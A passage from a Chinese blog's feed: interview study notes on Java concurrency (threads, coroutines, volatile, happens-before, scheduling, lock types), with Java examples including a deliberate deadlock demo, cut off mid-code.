      &lt;p&gt;&lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt;&lt;br&gt;别问 问就是为了面试豁出了老命&lt;br&gt;&lt;/excerpt&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>《天净沙·我·并发编程篇》  双非菜鸡奇葩，面试项目框架，java java，卑微学子去哪？</title>
    <link href="http://runindark.com/2020/03/09/2020%E6%98%A5%E6%8B%9B/%E6%88%91%E4%B8%BA%E9%98%BF%E9%87%8C/"/>
    <id>http://runindark.com/2020/03/09/2020春招/我为阿里/</id>
    <published>2020-03-09T12:19:18.601Z</published>
    <updated>2020-06-28T01:43:26.137Z</updated>
    
    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>别问 问就是为了面试豁出了老命<br><a id="more"></a></excerpt></p><the rest="" of="" contents="" |="" 余下全文=""><h2 id="进程，协程，线程基础概念"><a href="#进程，协程，线程基础概念" class="headerlink" title="进程，协程，线程基础概念"></a>进程，协程，线程基础概念</h2><h3 id="能否解释进程，线程，协程的关系？"><a href="#能否解释进程，线程，协程的关系？" class="headerlink" title="能否解释进程，线程，协程的关系？"></a>能否解释进程，线程，协程的关系？</h3><blockquote><p>进程是一个程序代码运行所执行的一个程序，但是一个进程可以包含多个线程，在单核cpu下，Java默认多线程可以以一种抢占式的方式执行一种并发状态，协程是近些年走进视野的，以GO语言为代表可以操作协程，一个线程中可以包含更多的协程，可以简单的说线程包含协程。</p></blockquote><h3 id="协程对于多线程有什么优缺点吗？"><a href="#协程对于多线程有什么优缺点吗？" class="headerlink" title="协程对于多线程有什么优缺点吗？"></a>协程对于多线程有什么优缺点吗？</h3><ol><li>首先是更小的协程可以在不使用内核的前提下进行上下文切换</li><li>一个线程就可以完成高并发的任务，对高并发的支持更好</li><li>协程在一个线程下，是不用考虑数据的读写不一致问题（读写变量冲突问题）</li><li>缺点： 缺点也很明显，本质还是一个单线程，不能利用多核资源，同时也不独立，需要线程，进程配合才可以运行</li></ol><h3 id="并行和并发的区别是什么？"><a href="#并行和并发的区别是什么？" class="headerlink" title="并行和并发的区别是什么？"></a>并行和并发的区别是什么？</h3><ol><li>并行是指多个程序 同时多个一起运行</li><li>并发是指多个程序在某一个时间段内交替的快速运行，宏观是有点类似并行，但是实际上是交替运行</li><li>恶补英语之==&gt; 并发 （concurrency）  并⾏ parallellism</li></ol><h2 id="多线程基础之实现（学了这么多年还真的第一次这么认真的去研究该怎么写）"><a href="#多线程基础之实现（学了这么多年还真的第一次这么认真的去研究该怎么写）" class="headerlink" title="多线程基础之实现（学了这么多年还真的第一次这么认真的去研究该怎么写）"></a>多线程基础之实现（学了这么多年还真的第一次这么认真的去研究该怎么写）</h2><h3 id="Java线程创建的几种方式"><a href="#Java线程创建的几种方式" class="headerlink" title="Java线程创建的几种方式"></a>Java线程创建的几种方式</h3><ol><li><p>继承extends</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.runindark.ways;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadByThread</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SayHello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Thread by extend Thread"</span>);</span><br><span class="line">        System.out.println(Thread.currentThread().getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        SayHello();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        ThreadByThread threadByThread = <span class="keyword">new</span> ThreadByThread() ;</span><br><span class="line">        threadByThread.start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>使用Runnable</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.runindark.ways;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadByRunnable</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Thread create by implements Runnable"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        ThreadByRunnable ta = <span class="keyword">new</span> ThreadByRunnable() ;</span><br><span class="line">        <span class="keyword">new</span> Thread(ta).start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>使用CF</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.runindark.ways;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Callable;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ExecutionException;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.FutureTask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadByCF</span> <span class="keyword">implements</span> <span class="title">Callable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Thread create by CF"</span> +<span class="string">":"</span> +Thread.currentThread().getName();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        FutureTask&lt;Object&gt; futureTask = <span class="keyword">new</span> FutureTask&lt;&gt;(<span class="keyword">new</span> ThreadByCF()) ;</span><br><span class="line">        Thread thread = <span class="keyword">new</span> Thread(futureTask);</span><br><span class="line">        thread.setName(<span class="string">"Cf"</span>);</span><br><span class="line">        thread.start();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(futureTask.get());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ExecutionException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>使用线程池</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.runindark.ways;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.print.DocFlavor;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ExecutorService;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Executors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadByPool</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        ExecutorService service = Executors.newFixedThreadPool(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line"></span><br><span class="line">            service.execute(<span class="keyword">new</span> ThreadByThread());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(Thread.currentThread());</span><br><span class="line">        service.shutdown();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="线程基本原理"><a href="#线程基本原理" class="headerlink" title="线程基本原理"></a>线程基本原理</h2><h3 id="线程有哪些状态"><a href="#线程有哪些状态" class="headerlink" title="线程有哪些状态"></a>线程有哪些状态</h3><blockquote><p>创建 -&gt; 就绪 -&gt; 执行 -&gt; 消亡<br>阻塞: 分为同步组织，等待阻塞。 等待阻塞就是wait啦，sleep啦。同步阻塞就是sychronize锁被占用，另一个线程也需要占用这个锁，结果凉了，就阻塞了。</p></blockquote><h3 id="线程的基本一些方法"><a href="#线程的基本一些方法" class="headerlink" title="线程的基本一些方法"></a>线程的基本一些方法</h3><ol><li>sleep<blockquote><p>就是进入了等待阻塞队列中，根据设定的时间阻塞，而且不会释放锁，他的阻塞状态就是time_waiting</p></blockquote></li><li>yield<blockquote><p>就是让线程立马停止一下，但是不会进入阻塞，而是直接进入就绪,且不会释放锁</p></blockquote></li><li>join<blockquote><p>有点救护车让道的意思，谁调用join谁先执行，然后再执行被停用的线程</p></blockquote></li><li>wait<blockquote><p>就是进入等待状态，而且必须有人去唤醒他，没人唤醒，就被打入阻塞冷宫这辈子也就这样了，但是wait会释放锁，也可以wait（time）来通过时间唤醒</p></blockquote></li><li>notify<blockquote><p>唤醒wait打入冷宫的老铁，但是唤醒谁不能指定，唤醒全靠缘分</p></blockquote></li><li>notifyall<blockquote><p>大发慈悲，冷宫的全放出来了</p></blockquote></li></ol><h3 id="线程不安全的同步容器比如？"><a href="#线程不安全的同步容器比如？" class="headerlink" title="线程不安全的同步容器比如？"></a>线程不安全的同步容器比如？</h3><blockquote><p>HashMap、ArrayList、LinkedList</p></blockquote><h2 id="volatile"><a href="#volatile" class="headerlink" title="volatile"></a>volatile</h2><h3 id="说说volatile的与sychronize的区别"><a href="#说说volatile的与sychronize的区别" class="headerlink" title="说说volatile的与sychronize的区别"></a>说说volatile的与sychronize的区别</h3><ol><li>volatile 不是原子性的，sychronize是原子性的</li><li>volatile和sychronize都保证了可见性</li><li>volatile是禁止了指令重排的</li><li>不能写入 不能修饰写⼊操作依赖当前值的变量，⽐如num++、num=num+1</li></ol><h3 id="为啥会出现脏读的问题？"><a href="#为啥会出现脏读的问题？" class="headerlink" title="为啥会出现脏读的问题？"></a>为啥会出现脏读的问题？</h3><blockquote><p>这个是JMM（java内存模型） 导致的，java线程中不是所有的变量都是在主存的，而是每个线程都有自己的一丢丢空间，对于修改的变量的操作，先从主存拿到，再修改，再写回去，如果多线程，可能因为速度问题，写入的时间啥的有差别，所以就会导致把数据脏读了。</p></blockquote><h3 id="为啥volatile可以解决这个问题呢？"><a href="#为啥volatile可以解决这个问题呢？" class="headerlink" title="为啥volatile可以解决这个问题呢？"></a>为啥volatile可以解决这个问题呢？</h3><blockquote><p>volatile就像是一个敏感的报警灯一样，一旦有人妄图修改volatile修饰的数据，立马报警通知修改情况，所以说原子性差了点，但是可见性或者说是共享性好的鸭匹</p></blockquote><h2 id="指令重排-happens-before"><a href="#指令重排-happens-before" class="headerlink" title="指令重排/happens-before"></a>指令重排/happens-before</h2><h3 id="啥是指令重排？"><a href="#啥是指令重排？" class="headerlink" title="啥是指令重排？"></a>啥是指令重排？</h3><blockquote><p>为了提高程序的执行效率，再不改变运行结果的前提下，jvm对字节码文件的指令重新排序，以提高效率</p></blockquote><h3 id="知道-happens-before吗，能否简单解释下？"><a href="#知道-happens-before吗，能否简单解释下？" class="headerlink" title="知道 happens-before吗，能否简单解释下？"></a>知道 happens-before吗，能否简单解释下？</h3><blockquote><p>由于多线程的特殊性，对jvm的指令重排有严格的限制，所以有了happens-before的原则（先行发生原则） ==&gt;（这个解释靠谱：前一个操作的结果可以被后续的操作获取。讲白点就是前面一个操作把变量a赋值为1，那后面一个操作肯定能知道a已经变成了1。）</p></blockquote><h3 id="划重点：这些规则一并奉上"><a href="#划重点：这些规则一并奉上" class="headerlink" title="划重点：这些规则一并奉上"></a>划重点：这些规则一并奉上</h3><ol><li><p>程序次序规则：在一个线程内一段代码的执行结果是有序的。就是还会指令重排，但是随便它怎么排，结果是按照我们代码的顺序生成的不会变！</p></li><li><p>管程锁定规则：就是无论是在单线程环境还是多线程环境，对于同一个锁来说，一个线程对这个锁解锁之后，另一个线程获取了这个锁都能看到前一个线程的操作结果！(管程是一种通用的同步原语，synchronized就是管程的实现）</p></li><li><p>volatile变量规则：就是如果一个线程先去写一个volatile变量，然后一个线程去读这个变量，那么这个写操作的结果一定对读的这个线程可见。</p></li><li><p>线程启动规则：在主线程A执行过程中，启动子线程B，那么线程A在启动子线程B之前对共享变量的修改结果对线程B可见。</p></li><li><p>线程终止规则：在主线程A执行过程中，子线程B终止，那么线程B在终止之前对共享变量的修改结果在线程A中可见。</p></li><li><p>线程中断规则：对线程interrupt()方法的调用先行发生于被中断线程代码检测到中断事件的发生，可以通过Thread.interrupted()检测到是否发生中断。</p></li><li><p>传递规则：这个简单的，就是happens-before原则具有传递性，即A happens-before B ， B happens-before C，那么A happens-before C。</p></li><li><p>对象终结规则：这个也简单的，就是一个对象的初始化的完成，也就是构造函数执行的结束一定 happens-before它的finalize()方法。</p></li></ol><h2 id="并发编程进阶"><a href="#并发编程进阶" class="headerlink" title="并发编程进阶"></a>并发编程进阶</h2><h3 id="并发编程三要素："><a href="#并发编程三要素：" class="headerlink" title="并发编程三要素："></a>并发编程三要素：</h3><h4 id="1-原子性"><a href="#1-原子性" class="headerlink" title="1. 原子性"></a>1. 原子性</h4><blockquote><p>要么全成功，要么全失败<br>例如num++ 这种操作就是非原子性的  可以用lock或者Sychronized来修饰这个操作</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">add2</span><span class="params">()</span></span>&#123;</span><br><span class="line">    num++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Lock lock = <span class="keyword">new</span> ReentrantLock();</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add1</span><span class="params">()</span></span>&#123;</span><br><span class="line">    lock.lock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        num++;</span><br><span class="line">    &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">        lock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-可见性"><a href="#2-可见性" class="headerlink" title="2. 可见性"></a>2. 可见性</h4><h4 id="3-有序性"><a href="#3-有序性" class="headerlink" title="3. 有序性"></a>3. 有序性</h4><h2 id="进程的执行顺序"><a href="#进程的执行顺序" class="headerlink" title="进程的执行顺序"></a>进程的执行顺序</h2><h3 id="先来先服务调度算法："><a href="#先来先服务调度算法：" class="headerlink" title="先来先服务调度算法："></a>先来先服务调度算法：</h3><blockquote><p>按照作业/进程到达的先后顺序进⾏调度 ，即：优先考虑在系统中等待时间最⻓的作业<br>排在⻓进程后的短进程的等待时间⻓，不利于短作业/进程</p></blockquote><h3 id="短作业优先调度算法："><a href="#短作业优先调度算法：" class="headerlink" title="短作业优先调度算法："></a>短作业优先调度算法：</h3><blockquote><p>短进程/作业（要求服务时间最短）在实际情况中占有很⼤⽐例，为了使得它们优先执⾏<br>对⻓作业不友好</p></blockquote><h3 id="⾼响应⽐优先调度算法"><a href="#⾼响应⽐优先调度算法" class="headerlink" title="⾼响应⽐优先调度算法:"></a>⾼响应⽐优先调度算法:</h3><blockquote><p>在每次调度时，先计算各个作业的优先权：优先权=响应⽐=（等待时间+要求服务时间）/<br>要求服务时间,<br>因为等待时间与服务时间之和就是系统对该作业的响应时间，所以 优先权=响应⽐=响应<br>时间/要求服务时间，选 择优先权⾼的进⾏服务需要计算优先权信息，增加了系统的开销</p></blockquote><h4 id="时间⽚轮转调度算法"><a href="#时间⽚轮转调度算法" class="headerlink" title="时间⽚轮转调度算法:"></a>时间⽚轮转调度算法:</h4><blockquote><p>轮流的为各个进程服务，让每个进程在⼀定时间间隔内都可以得到响应<br>由于⾼频率的进程切换，会增加了开销，且不区分任务的紧急程度</p></blockquote><h3 id="优先级调度算法"><a href="#优先级调度算法" class="headerlink" title="优先级调度算法:"></a>优先级调度算法:</h3><blockquote><p>根据任务的紧急程度进⾏调度，⾼优先级的先处理，低优先级的慢处理<br>如果⾼优先级任务很多且持续产⽣，那低优先级的就可能很慢才被处理</p></blockquote><h2 id="线程的调度算法"><a href="#线程的调度算法" class="headerlink" title="线程的调度算法"></a>线程的调度算法</h2><h3 id="协同式线程调度-分时调度模式-："><a href="#协同式线程调度-分时调度模式-：" class="headerlink" title="协同式线程调度(分时调度模式)："></a>协同式线程调度(分时调度模式)：</h3><blockquote><p>线程执⾏时间由线程本身来控制，线程把⾃⼰的⼯作执⾏完之后，<br>要主动通知系统切换到另外⼀个线程上。最⼤好处是实现简单，且切换操作对线程⾃⼰是可知的，没<br>啥线程同步问题。坏处是线程执⾏时间不可控制，如果⼀个线程有问题，可能⼀直阻塞在那⾥</p></blockquote><blockquote><p>(佛系顺序执行，自己完事叫下一个继续)</p></blockquote><h3 id="抢占式线程调度："><a href="#抢占式线程调度：" class="headerlink" title="抢占式线程调度："></a>抢占式线程调度：</h3><blockquote><p>每个线程将由系统来分配执⾏时间，线程的切换不由线程本身来决定（Java中，<br>Thread.yield()可以让出执⾏时间，但⽆法获取执⾏时间）。线程执⾏时间系统可控，也不会有⼀<br>个线程导致整个进程阻塞</p></blockquote><h2 id="锁"><a href="#锁" class="headerlink" title="锁"></a>锁</h2><h3 id="悲观锁"><a href="#悲观锁" class="headerlink" title="悲观锁"></a>悲观锁</h3><blockquote><p>每次读写数据都是悲观的，认为可能会出现数据被其它线程读的问题，所以要上锁比如sychronized</p></blockquote><h3 id="乐观锁"><a href="#乐观锁" class="headerlink" title="乐观锁"></a>乐观锁</h3><blockquote><p>每次读取数据都觉得是乐观的，觉得不会有其它线程更改要读取的数据</p></blockquote><h3 id="公平锁"><a href="#公平锁" class="headerlink" title="公平锁"></a>公平锁</h3><blockquote><p>就是大家人人平等，都可以拿到锁，阻塞队列中按照顺序慢慢来=》reetrantlock（fair）</p></blockquote><h3 id="非公平锁"><a href="#非公平锁" class="headerlink" title="非公平锁"></a>非公平锁</h3><blockquote><p>不公平的，只要你条件符合，就可以直接拿到锁=》reetrantlock（unfair）<br>reetrantlock其实底层就是一个队列，所以也是先来先服务那种，在公平锁体现的很好</p></blockquote><h3 id="重入锁"><a href="#重入锁" class="headerlink" title="重入锁"></a>重入锁</h3><blockquote><p>一个线程里吧，还调用另一个线程，然后这个锁对里面的这个线程也生效</p></blockquote><h3 id="不可重入锁"><a href="#不可重入锁" class="headerlink" title="不可重入锁"></a>不可重入锁</h3><blockquote><p>一个线程里吧，还调用另一个线程，然后吧，里面这个线程就不能用这个锁了，就只能乖巧的滚去阻塞队列了</p></blockquote><h3 id="自旋锁"><a href="#自旋锁" class="headerlink" title="自旋锁"></a>自旋锁</h3><blockquote><p>就是想不开的锁，只要没条件获取到锁，就一直自旋，也就是一直去判断条件看看自己能不能获得锁子，while（flag）的感觉，除非获得锁才能结束，但是注意，自旋锁消耗cpu，毕竟在那转来转去的。<br>不会发⽣线程状态的切换，⼀直处于⽤户态，减少了线程上下⽂切换的消耗，缺点是循环会消耗CPU</p></blockquote><h3 id="共享锁"><a href="#共享锁" class="headerlink" title="共享锁"></a>共享锁</h3><blockquote><p>也就是读锁，或者是S锁，就是可以让大家读取，查看，就是不能修改</p></blockquote><h3 id="排他锁"><a href="#排他锁" class="headerlink" title="排他锁"></a>排他锁</h3><blockquote><p>也就是霸占一把锁，只要这个线程占着，别人就不能去获取这个锁，但是只要霸占这个锁，能读能写</p></blockquote><h3 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h3><blockquote><p>资源抢占矛盾循环了，无外力介入，是解不开的</p></blockquote><h3 id="关于jvm自己内部的几个锁"><a href="#关于jvm自己内部的几个锁" class="headerlink" title="关于jvm自己内部的几个锁"></a>关于jvm自己内部的几个锁</h3><h4 id="偏向锁"><a href="#偏向锁" class="headerlink" title="偏向锁"></a>偏向锁</h4><blockquote><p>就是如果哪个线程一直用着这个锁，就一直让他先用，更少的消耗量</p></blockquote><h4 id="轻量级锁"><a href="#轻量级锁" class="headerlink" title="轻量级锁"></a>轻量级锁</h4><blockquote><p>如果其他锁妄图获得人家那个偏向锁，那就自旋吧，等人家用完才给你</p></blockquote><h4 id="重量级锁"><a href="#重量级锁" class="headerlink" title="重量级锁"></a>重量级锁</h4><blockquote><p>自选锁也不自旋了，直接阻塞进化成重量级锁，重量级锁会让其他申请的线程进⼊阻塞，性能也会降低</p></blockquote><h2 id="死锁-1"><a href="#死锁-1" class="headerlink" title="死锁"></a>死锁</h2><h3 id="死锁代码"><a href="#死锁代码" class="headerlink" title="死锁代码"></a>死锁代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.runindark.deadlock;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DeadLock</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String locka = <span class="string">"A"</span> ;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String lockb = <span class="string">"B"</span> ;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">LockA</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (locka)&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">"entre the locka"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">synchronized</span> (lockb)&#123;</span><br><span class="line">                System.out.println(<span class="string">"a 取 b"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">LockB</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">synchronized</span> (lockb)&#123;</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">"entre the lockb"</span>);</span><br><span class="line">            <span class="keyword">synchronized</span> (locka)&#123;</span><br><span class="line">                System.out.println(<span class="string">"b 取 a"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line"></span><br><span class="line">          System.out.println(i+<span class="number">1</span> + <span class="string">"次"</span>);</span><br><span class="line">          <span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">              DeadLock.LockA();</span><br><span class="line">          &#125;).start();</span><br><span class="line"></span><br><span class="line">          <span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">              DeadLock.LockB();</span><br><span class="line">          &#125;).start();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解锁代码"><a href="#解锁代码" class="headerlink" title="解锁代码"></a>解锁代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.runindark.deadlock;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span 